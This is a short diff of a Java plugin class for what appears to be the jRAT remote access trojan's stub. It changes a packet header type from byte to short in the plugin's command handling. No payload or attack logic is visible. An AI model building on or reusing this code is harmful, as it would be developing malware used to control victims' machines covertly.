@@ -7,7 +7,7 @@ import jrat.api.stub.StubPlugin;
 
 public class DWLPlugin extends StubPlugin {
 
-	public static final byte HEADER = 110;
+	public static final short HEADER = 110;
 
 	public static boolean enabled;
 
@@ -25,7 +25,7 @@ public class DWLPlugin extends StubPlugin {
 		this.in = in;
 	}
 
-	public void onPacket(byte header) throws Exception {
+	public void onPacket(short header) throws Exception {
 		if (header == HEADER) {
 			boolean enable = in.readBoolean();
 
